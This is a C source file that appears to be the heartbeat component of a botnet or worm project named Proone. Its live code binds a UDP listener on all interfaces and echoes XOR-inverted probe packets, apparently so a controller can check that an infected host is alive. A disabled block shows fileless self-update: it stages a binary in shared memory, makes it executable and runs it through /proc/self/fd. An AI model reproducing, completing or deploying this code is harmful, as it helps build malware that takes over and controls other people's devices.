#include "htbt-worker.h"
#include "protocol.h"
#include "proone.h"
#include "util_rt.h"
#include "dvault.h"

#include <stdlib.h>
#include <string.h>

#include <unistd.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/mman.h>
#include <sys/stat.h>

#define DECL_CTX_PTR(p) hb_w_ctx_t *ctx = (hb_w_ctx_t*)p;

typedef struct hb_w_ctx hb_w_ctx_t;

struct hb_w_ctx {
	int fd;
	int domain;
	uint8_t rcv_buf[256];
	bool finalised;
};


#if 0
static int create_ny_bin_shm (prne_rnd_engine_t *rnd) {
    static const size_t str_len = sizeof(prne_s_g->ny_bin_shm_name);

    prne_s_g->ny_bin_shm_name[0] = '/';
    prne_s_g->ny_bin_shm_name[str_len - 1] = 0;
    prne_rnd_anum_str(rnd, prne_s_g->ny_bin_shm_name + 1, str_len - 2);
    
    return shm_open(prne_s_g->ny_bin_shm_name, O_RDWR | O_CREAT | O_TRUNC, 0700);
}

static void exec_ny_bin (void) {
    // Just die on error
    static const size_t proc_fd_path_size = 14 + 11 + 1;
    int fd;
    uint8_t *data;
    size_t i;
    const char **args;
    struct stat st;
    char *proc_fd_path, *real_shm_path;
    prne_htbt_cmd_t cmd;

    prne_htbt_init_cmd(&cmd);

    fd = shm_open(prne_s_g->ny_bin_shm_name, O_RDONLY, 0);
    if (fd < 0) {
        abort();
    }
    if (fstat(fd, &st) < 0 || st.st_size <= 0 || (size_t)st.st_size < prne_s_g->ny_bin_size) {
        abort();
    }
    data = (uint8_t*)mmap(NULL, (size_t)st.st_size, PROT_READ, MAP_SHARED, fd, 0);

    if (prne_htbt_deserialise_cmd(data + prne_s_g->ny_bin_size, (size_t)st.st_size - prne_s_g->ny_bin_size, NULL, &cmd) != PRNE_HTBT_DESER_RET_OK) {
        abort();
    }

    munmap(data, (size_t)st.st_size);
    data = NULL;
    ftruncate(fd, prne_s_g->ny_bin_size);

    args = prne_malloc(sizeof(const char*), (size_t)cmd.argc + 2);
    for(i = 1; i <= cmd.argc; i += 1) {
        args[i] = cmd.mem + cmd.offset_arr[i];
    }
    args[i] = NULL;

    proc_fd_path = prne_malloc(1, proc_fd_path_size);
    snprintf(proc_fd_path, proc_fd_path_size, "/proc/self/fd/%d", fd);
    if (lstat(proc_fd_path, &st) < 0) {
        abort();
    }

    real_shm_path = prne_malloc(1, st.st_size + 1);
    if (readlink(proc_fd_path, real_shm_path, st.st_size) != st.st_size) {
        abort();
    }
    prne_free(proc_fd_path);
    proc_fd_path = NULL;
    args[0] = real_shm_path;
    
    fchmod(fd, 0777);
    prne_close(fd);
    fd = -1;

    if (execv(real_shm_path, (char *const*)args) < 0) {
        abort();
    }
}
#endif


static void heartbeat_worker_free (void *in_ctx) {
	DECL_CTX_PTR(in_ctx);
	prne_close(ctx->fd);
	prne_free(ctx);
}

static void heartbeat_worker_fin (void *in_ctx) {
	DECL_CTX_PTR(in_ctx);
	ctx->finalised = true;
}

static void heartbeat_worker_work (void *in_ctx, const prne_worker_sched_info_t *sched_info, prne_worker_sched_req_t *sched_req) {
	DECL_CTX_PTR(in_ctx);

	if (sched_req->pollfd_ready) {
		const short revents = sched_req->pollfd_arr[0].revents;

		if (revents & (POLLERR | POLLHUP | POLLNVAL)) {
			ctx->finalised = true;
			sched_req->flags = PRNE_WORKER_SCHED_FLAG_NONE;
			return;
		}
		if (revents & POLLIN) {
			socklen_t addr_len;

			// TODO
			
			if (ctx->domain == AF_INET) {
				struct sockaddr_in remote_addr;

				addr_len = sizeof(struct sockaddr_in);
				if (recvfrom(ctx->fd, ctx->rcv_buf, sizeof(ctx->rcv_buf), 0, (struct sockaddr*)&remote_addr, &addr_len) == sizeof(ctx->rcv_buf)) {
					prne_dvault_invert_mem(sizeof(ctx->rcv_buf) - 1, ctx->rcv_buf + 1, ctx->rcv_buf[0]);
					sendto(ctx->fd, ctx->rcv_buf + 1, sizeof(ctx->rcv_buf) - 1, 0, (const struct sockaddr*)&remote_addr, addr_len);
				}
			}
			else {
				struct sockaddr_in6 remote_addr;

				addr_len = sizeof(struct sockaddr_in6);
				if (recvfrom(ctx->fd, ctx->rcv_buf, sizeof(ctx->rcv_buf), 0, (struct sockaddr*)&remote_addr, &addr_len) == sizeof(ctx->rcv_buf)) {
					prne_dvault_invert_mem(sizeof(ctx->rcv_buf) - 1, ctx->rcv_buf + 1, ctx->rcv_buf[0]);
					sendto(ctx->fd, ctx->rcv_buf + 1, sizeof(ctx->rcv_buf) - 1, 0, (const struct sockaddr*)&remote_addr, addr_len);
				}
			}
		}
	}

	sched_req->flags = PRNE_WORKER_SCHED_FLAG_POLL;
	sched_req->mem_func.alloc(sched_req, 1);
	sched_req->pollfd_arr[0].fd = ctx->fd;
	sched_req->pollfd_arr[0].events = POLLIN;
}

static bool heartbeat_worker_has_finalised (void *in_ctx) {
	DECL_CTX_PTR(in_ctx);
	return ctx->finalised;
}


bool prne_alloc_htbt_worker (prne_worker_t *w) {
	bool ret = true;
	hb_w_ctx_t *ctx = NULL;
	
	ctx = (hb_w_ctx_t*)prne_malloc(sizeof(hb_w_ctx_t), 1);
	if (ctx == NULL) {
		ret = false;
		goto END;
	}
	ctx->fd = -1;
	ctx->domain = 0;
	ctx->finalised = false;

	ctx->fd = socket(AF_INET6, SOCK_DGRAM, 0);
	if (ctx->fd < 0) {
		ctx->fd = socket(AF_INET, SOCK_DGRAM, 0);

		if (ctx->fd < 0) {
			ret = false;
			goto END;
		}
		ctx->domain = AF_INET;
	}
	else {
		ctx->domain = AF_INET6;
	}

	if (fcntl(ctx->fd, F_SETFL, O_NONBLOCK) < 0) {
		ret = false;
		goto END;
	}

	if (ctx->domain == AF_INET) {
		struct sockaddr_in local_addr;
		
		memset(&local_addr, 0, sizeof(struct sockaddr_in));
		local_addr.sin_family = AF_INET;
		local_addr.sin_port = htons(PRNE_HTBT_PROTO_PORT);
		local_addr.sin_addr.s_addr = INADDR_ANY;

		if (bind(ctx->fd, (const struct sockaddr*)&local_addr, sizeof(struct sockaddr_in)) < 0) {
			ret = false;
			goto END;
		}
	}
	else {
		struct sockaddr_in6 local_addr;

		memset(&local_addr, 0, sizeof(struct sockaddr_in6));
		local_addr.sin6_family = AF_INET6;
		local_addr.sin6_port = htons(PRNE_HTBT_PROTO_PORT);		

		if (bind(ctx->fd, (const struct sockaddr*)&local_addr, sizeof(struct sockaddr_in6)) < 0) {
			ret = false;
			goto END;
		}
	}

	w->ctx = ctx;
	w->free = heartbeat_worker_free;
	w->fin = heartbeat_worker_fin;
	w->work = heartbeat_worker_work;	
	w->has_finalised = heartbeat_worker_has_finalised;

END:
	if (!ret) {
		if (ctx != NULL) {
			prne_close(ctx->fd);
		}
		prne_free(ctx);
	}

	return ret;
}
